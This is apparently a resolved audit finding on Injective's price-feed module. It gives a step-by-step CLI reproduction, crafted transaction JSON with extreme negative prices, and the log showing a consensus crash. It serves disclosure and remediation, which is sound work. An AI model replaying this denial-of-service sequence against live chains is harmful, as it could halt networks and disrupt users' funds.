### IF-INJECTIVE-11
## Price feed does not validate prices, may crash consensus #331

**Status: resolved** (as of June 15, 2021)

**Severity**: High

**Type**: Distributed System Reliability and Fault Tolerance

**Difficulty**: High

_Surfaced from @informalsystems audit at hash baa69e1c366e9dc8727c7385fa120c08162b08e0_

_The crash is resolved in PR: https://github.com/InjectiveLabs/injective-core/pull/333_

_The general recommendation still applies._


`pricefeed_msg_server.go` does not validate the messages, so it is possible to feed it with arbitrary large (or small) values, e.g., `2^(255-60) - 1` and `-2^(255-60)+1`. When the price feed reports `-2^(255-60)+1` several times, consensus crashes. Note that such values are not necessary a sign of an attack, but can originate from faulty software.

**How to reproduce:**
Here is a sequence of commands to reproduce the issue on a clean installation (initialized with `./setup.sh`):

```sh
injectived tx oracle grant-price-feeder-privilege-proposal inj atom \
  inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs --deposit=10000000inj \
  --title="price feeder inj/atom" --description="price feeder inj/atom" \
  --from=user2 --chain-id=injective-888 --broadcast-mode=block --yes
sleep 2
injectived tx gov vote 1 yes --from=genesis --chain-id=injective-888 \
  --broadcast-mode=block --yes
sleep 15

injectived tx sign --from=inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs \
  --chain-id=injective-888 --output-document=signed1.json unsigned1.json
injectived tx broadcast --broadcast-mode=block signed1.json

injectived tx exchange deposit 1000.000000000000000000inj \
  --from=inj1dzqd00lfd4y4qy2pxa0dsdwzfnmsu27hgttswz --chain-id=injective-888 \
  --broadcast-mode=block --yes

injectived tx insurance create-insurance-fund --ticker=inj/atom \
  --quote-denom=inj --oracle-base=inj --oracle-quote=atom \
  --oracle-type=PriceFeed --expiry=1623325840 --initial-deposit=10000000inj \
  --from=genesis --chain-id=injective-888 --broadcast-mode=block --yes
sleep 1

injectived tx exchange instant-expiry-futures-market-launch \
  --ticker=inj/atom --quote-denom=inj --oracle-base=inj --oracle-quote=atom \
  --oracle-type=PriceFeed --expiry=1623325840 --maker-fee-rate=0.001 \
  --taker-fee-rate=0.001 --initial-margin-ratio=0.05 \
  --maintenance-margin-ratio=0.02 --min-price-tick-size=0.000000000000000001 \
  --min-quantity-tick-size=0.000000000000000001 --from=user1 \
  --chain-id=injective-888 --broadcast-mode=block --yes
sleep 2

injectived tx exchange deposit 1.000000000000000000inj \
  --from=inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs --chain-id=injective-888 \
  --broadcast-mode=block --yes

injectived tx sign --from=inj1dzqd00lfd4y4qy2pxa0dsdwzfnmsu27hgttswz \
  --chain-id=injective-888 --output-document=signed2.json unsigned2.json
injectived tx broadcast --broadcast-mode=block signed2.json

injectived tx sign --from=inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs \
  --chain-id=injective-888 --output-document=signed3.json unsigned3.json
injectived tx broadcast --broadcast-mode=block signed3.json

injectived tx sign --from=inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs \
  --chain-id=injective-888 --output-document=signed4.json unsigned4.json
injectived tx broadcast --broadcast-mode=block signed4.json

injectived tx sign --from=inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs \
  --chain-id=injective-888 --keyring-backend file unsigned10.json \
  >signed10.json && injectived tx broadcast signed10.json  -b block
```

(The above sequence is most likely not the shortest one possible.)

The unsigned json files are like follows:

```sh
cat unsigned1.json 
{"body": {"messages": [{"@type":
  "/injective.oracle.v1beta1.MsgRelayPriceFeedPrice",
  "sender": "inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs",
  "base": ["inj"], "quote": ["atom"], "price": ["1.000000000000000000"]}],
  "memo": "", "timeout_height": "0", "extension_options": [],
  "non_critical_extension_options": []}, "auth_info": {"signer_infos": [],
  "fee": {"amount": [], "gas_limit": "200000", "payer": "", "granter": ""}},
  "signatures": []}

cat unsigned2.json

{"body": {"messages": [{"@type":
"/injective.exchange.v1beta1.MsgCreateDerivativeLimitOrder", "sender":
"inj1dzqd00lfd4y4qy2pxa0dsdwzfnmsu27hgttswz", "order": {"market_id":
"0x7b01f008f84e7b87c93dc69efc0a0d860f09a17c5024e10de7b024dca45066bb",
"order_info": {"subaccount_id":
"0x6880D7bfE96D49501141375ED835C24cf70E2bD7000000000000000000000000",
"fee_recipient": "inj1dzqd00lfd4y4qy2pxa0dsdwzfnmsu27hgttswz", "price":
"0.000000000000000001", "quantity": "0.000000000000000001"}, "order_type":
"SELL", "margin": "0.000000000000000001", "trigger_price": null}}], "memo": "",
"timeout_height": "0", "extension_options": [],
"non_critical_extension_options": []}, "auth_info": {"signer_infos": [], "fee":
{"amount": [], "gas_limit": "200000", "payer": "", "granter": ""}},
"signatures": []}

cat unsigned3.json

{"body": {"messages": [{"@type":
"/injective.exchange.v1beta1.MsgCreateDerivativeLimitOrder", "sender":
"inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs", "order": {"market_id":
"0x7b01f008f84e7b87c93dc69efc0a0d860f09a17c5024e10de7b024dca45066bb",
"order_info": {"subaccount_id":
"0x963EBDf2e1f8DB8707D05FC75bfeFFBa1B5BaC17000000000000000000000000",
"fee_recipient": "inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs", "price":
"0.000000000000000001", "quantity": "0.000000000000000001"}, "order_type":
"BUY", "margin": "0.000000000000000021", "trigger_price": null}}], "memo": "",
"timeout_height": "0", "extension_options": [],
"non_critical_extension_options": []}, "auth_info": {"signer_infos": [], "fee":
{"amount": [], "gas_limit": "200000", "payer": "", "granter": ""}},
"signatures": []}

cat unsigned4.json

{"body": {"messages": [{"@type":
"/injective.oracle.v1beta1.MsgRelayPriceFeedPrice", "sender":
"inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs", "base": ["inj"], "quote":
["atom"], "price":
["-28948022309329048855892746252171976963317496166410141009864.396001978282409983"]}],
"memo": "", "timeout_height": "0", "extension_options": [],
"non_critical_extension_options": []}, "auth_info": {"signer_infos": [], "fee":
{"amount": [], "gas_limit": "200000", "payer": "", "granter": ""}},
"signatures": []}

cat unsigned10.json

{"body": {"messages": [{"@type":
"/injective.oracle.v1beta1.MsgRelayPriceFeedPrice", "sender":
"inj1jcltmuhplrdcwp7stlr4hlhlhgd4htqhe4c0cs", "base": ["inj"], "quote":
["atom"], "price":
["-50216813883093446110686315385661331328818843555712276103167.999999999999999999"]}],
"memo": "", "timeout_height": "0", "extension_options": [],
"non_critical_extension_options": []}, "auth_info": {"signer_infos": [], "fee":
{"amount": [], "gas_limit": "200000", "payer": "", "granter": ""}},
"signatures": []}

```


Example of the output in the server log:

``` ERRO[0256] CONSENSUS FAILURE!!!                          err="decimal out
of range; got: 259, max: 255" module=consensus stack="goroutine 114
...
...oracle/keeper.Keeper.GetCumulativePrice(0x0,
0x0, 0x0, 0x0, 0x0, 0x0, 0x2c74170, 0xc001478a50, 0x2cb3678, 0xc000e0c8d0,
```

**Recommendation:** Validate and filter the input that is received from the
price oracles. For instance, there is probably no economic sense in negative
prices. If it is not clear how to constrain the prices, you could receive price
values from `3 * f + 1` oracles, throw away the `f` smallest values and the `f`
largest values and average the rest. By doing so you can deal with Byzantine
oracles.
